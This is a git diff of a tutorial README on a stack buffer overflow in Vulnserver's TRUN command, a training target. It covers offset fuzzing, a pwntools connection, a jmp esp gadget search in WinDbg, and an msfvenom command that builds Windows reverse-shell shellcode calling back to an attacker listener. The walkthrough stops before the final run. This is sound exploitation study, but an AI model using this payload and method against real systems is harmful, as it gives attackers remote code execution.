@@ -1,4 +1,4 @@
-# Vulnserver-TRUN-ReverseShell
+<img width="381" height="260" alt="image" src="https://github.com/user-attachments/assets/68ce5350-823f-4ff9-be4f-6d022feb7a5e" /><img width="465" height="233" alt="image" src="https://github.com/user-attachments/assets/7ed7b3f2-994c-4dc3-9dd9-7b5418e54c3a" /># Vulnserver-TRUN-ReverseShell
 
 - The goal from this challenge is get a reverse shell to our linux machine as the user running the process (mine will be called MALDEV01)
 - Requirements for this challenge is a Windows VM with Windbg (I will be using the old version, but the new one should be fine), and a linux machine to catch the shell and generate the shellcode.
@@ -38,9 +38,205 @@ You can also add disassembly, memory, etc. But I will now dive into exploitation
 
 We will first need to fuzz the offset. The offset is here is how many bytes/characters to do we need to add to the buffer to overwrite the EIP pointer. EIP stands for the Instruction pointer, where the 'E' indicates a x86 bit register.
 
-There are alot of ways to fuzz for the offset. What i will use is msf-pattern_create
+There are alot of ways to fuzz for the offset. What i will use is msf-pattern_create and msf-pattern_offset on my kali linux machine :
+
+```
+msf-pattern_create -l 4000 > exp.py
+```
+
+<img width="845" height="754" alt="image" src="https://github.com/user-attachments/assets/bdaae70e-0530-4fe2-92ac-c19800f84416" />
+
+
+We can now open exp.py and organize everything we need to do.
+To ensure organization, you need to do the following :
+
+- connect to the target
+- create the buffer
+- send the buffer
+- debug the output
+
+Although this might seem as alot, we are not here to make seem hard.
+
+To connect to the target, we can use pwntools using the following syntax :
+
+```
+from pwn import *
+
+io = remote("192.168.225.159", 9999) 
+# this is basically how to connect
+```
+
+Where 9999 is the port that the vulnserver will be running on.
+We already created to buffer we are going to send, and the reason why we used msf to createt it is because we will be overwriting the EIP pointer, so once we overwrite it, it will contain a specific part that was in our buffer, hence, we can copy what eip stopped at and from there check for the offset using msf-pattern_offset -l 4000 -q <paste-eip>.
+
+Before we go any further, we need to analyze the source code found here : https://github.com/stephenbradshaw/vulnserver/blob/master/vulnserver.c 
+
+Look at line 204 :
+
+			} else if (strncmp(RecvBuf, "TRUN ", 5) == 0) {
+				char *TrunBuf = malloc(3000);
+				memset(TrunBuf, 0, 3000);
+				for (i = 5; i < RecvBufLen; i++) {
+					if ((char)RecvBuf[i] == '.') {
+						strncpy(TrunBuf, RecvBuf, 3000);				
+						Function3(TrunBuf);
+						break;
+					}
+				}
+
+This basically tells us that, if we add a dot : "." after the 5 characters with TRUN including the space "TRUN ", the code will copy our buffer and put it in TrunBuf using the vulnerable function called 'strncpy'.
+
+So, to achieve we want, which is a shell, which is execution of code in the stack, we will need to send the number of bytes to the offset, and leave the eip for the 'jmp esp' gadget (I will explain this now), and then add our buffer.
+
+Now to visualize this, I will need to explain what NOPs are too. 
+
+So 'jmp esp' in assembly means the following. "esp" represents the Stack Pointer. "jmp" here means Jump to the first paramter, which is expected to e register. So we are bascially saying, Jump to stack. Once we do that, our shellcode will already be found there, hence executing it. Incase you are wondering now, the shellcode will be generate with msfvenom.
+
+And "NOP" of "\x90" is just a byte that doesn't do anything. It's used for padding, meaning readjusting the start/finish/postition of the pointer to start where you want it to be. It's just a byte that takes up space to execute what you want.
+
+You might be wondering, why do we need it ?  We need it because when we jump to stack (and this something you need to know), we don't always start at the top of the stack or esp. There is almost alwyas a small constant slip that can be a few bytes earlier, which if it does happen, can execute bytes inside the "decoder" stub instead of the first byte of your shellcode, missing up your execution leading to an access violation.
+
+Now that we have a good idea about all the concepts, let't actually start smashing the stack.
+
+So after running this command : 
+
+```
+msf-pattern_create -l 4000 > exp.py
+```
+
+We will declare a variable that will hold it, let's call it payload :
+
+
+<img width="746" height="149" alt="image" src="https://github.com/user-attachments/assets/dc576eab-d41f-4a45-936f-6fa999999175" />
+
+
+But this is wrong, we need to first add the string in 1 quotations and add a "b" before them, indicating we are sending byte objects.
+
+Like this :
+
+
+<img width="530" height="142" alt="image" src="https://github.com/user-attachments/assets/90d1d889-65bc-497b-a31d-e3e88d79662e" />
+
+
+Now, To send our bytes correctly, we need to add the correct prefix, being "TRUN .", this will change our code a bit :
+
+```python
+payload = b'TRUN .'
+payload += b'Aa0......' # where the payload += means add the to the TRUN .Aa0...
+```
+ Now, to send these bytes, we will use pwntools to send it using io.sendline, where io is the variable the holds the connection :
+
+```
+io.sendline(payload)
+```
+
+Which should look like this in the end :
+
+
+<img width="658" height="155" alt="image" src="https://github.com/user-attachments/assets/c3ef2f50-89a3-4ee2-a339-d123196edcf4" />
+
+
+After running exp.py, ensuring that windbg is attached (u might need to restart windbg and vulnserver), you should be met with this Access Violation :
+
+
+<img width="656" height="139" alt="image" src="https://github.com/user-attachments/assets/4b918443-e76e-42e0-ac31-f8e8f020e4a8" />
+
+
+Looking at EIP, we see that it holds a value, if u find this output to be messy, you might need to use this command : `r eip` where 'r' represents Register and the second parameter is a filter parameter by register :
+
+<img width="687" height="145" alt="image" src="https://github.com/user-attachments/assets/04435429-9cba-4841-a691-b000f17c880c" />
+
+We copy this value to our kali machine and run msf-patttern_offset with it  (396f4338) :
+
+<img width="444" height="117" alt="image" src="https://github.com/user-attachments/assets/b64c6fff-d9fa-405c-bdb7-4da68a8798f7" />
+
+
+We now know our offset is at 2006, Perfect.
+
+For the next step, we need to find the 'jmp esp' gadget. it can also be a 'call esp' gadget too.
+
+In the same access violation page, we need to run the following, which will be explaining. 
+
+First, run 'lm', which means "list modules":
+
+<img width="530" height="171" alt="image" src="https://github.com/user-attachments/assets/ce674ba1-d51d-418e-bf8c-42d950432338" />
+
+What will interest us is essfunc, because it is the dll that is linked to the vulnserver binary, it contains custom added asm functions if you look here : https://github.com/stephenbradshaw/vulnserver/blob/master/essfunc.c
+
+<img width="996" height="700" alt="image" src="https://github.com/user-attachments/assets/66ec3a9a-85e5-4903-9bee-0e8075195da6" />
+
+
+Which is our interest.
+
+Now, we will search for jmp esp. jmp esp in hex (can be found by searching) is FF E4.
+
+Windbg has search command, and the syntax is as follows :
+
+```
+s -b <start> <end> byte1 byte2 .. .. ..  
+```
+
+"s" means search, "b" indicates "in the following range". start and end are what are shown in the image below :
+
+<img width="465" height="233" alt="image" src="https://github.com/user-attachments/assets/823cbe40-8c17-4ee3-8aad-1366cd2be303" />
+
+and for the bytes of our interest, we want ff e4.
+
+So our full command will look like this :
+
+```
+s -b 62500000 62508000 ff e4 
+```
+
+And we see the following :
+
+
+<img width="684" height="290" alt="image" src="https://github.com/user-attachments/assets/d9b37655-7529-435f-a376-cafceecc4d88" />
+
+All of these addresses are valid 'jmp esp' addresses, you can use whatever you wish.
+
+Since we now know the offset is 2006, let's create a variable and add 2006 A's for padding until the eip pointer :
+
+<img width="504" height="241" alt="image" src="https://github.com/user-attachments/assets/760a17fa-b3e2-4dee-b2fe-66e7a086a07c" />
+
+We also got the jmp esp gadget. We will add it right after the A's because the the next 4 bytes after the A's will be held in the EIP pointer. so we will add one of the address we talked about earlier :
+
+<img width="381" height="260" alt="image" src="https://github.com/user-attachments/assets/f8dcc14b-a57b-4cdb-9cbf-84033d2d29d1" />
+
+
+Where p32() means pack into 32 bits, which means 4 bytes. Which is exactly what we need!
+
+For our final step, we need the shellcode we will use to get the reverse shell, this can easily be done using msfvenom :
+
+```
+msfvenom -a x86 --platform windows -p windows/shell_reverse_tcp LHOST=192.168.225.128 LPORT=4444 -b \x00 -e x86/shikata_ga_nai -f python
+```
+
+Where LHOST is your linux IP and LPORT is your listener IP (to catch the shell) :
+
+
+<img width="698" height="661" alt="image" src="https://github.com/user-attachments/assets/f4630672-0230-4de5-bb1c-d1f2ffe6e20e" />
+
+
+Copy it and add to the script of ours, and add it to the payload after the 'jmp esp' :
+
+<img width="551" height="628" alt="image" src="https://github.com/user-attachments/assets/6a853e1c-f4e7-4730-8f1b-d7bd2462b200" />
+
+We are now ready to get the shell, but we have only one problem. 
+
+When we talked about nops earlier, we said that when we jump to ESP, we don't exactly start at byte 0 or on top of it. There is always some bytes that comes before it ruining our execution flow.
+
+So, since we said add nops "after jumping to the stack", we mean add it after the pointer. So it should be before our buffer and after the "jmp esp" address.
+
+But how much ? Usually it varies, but adding 16 or more nops is always guaranteed to work almost everytime!
+
+Let's now add it and see :
 
 
 
 
-Vulnserver is a famous binary for studying basic binary exploitation. In this blog, I will be showcasing phase 1 in general vulnserver studies... Being the "TRUN" prefix. This is not considered hard by any means. 
+
+
+
+
+
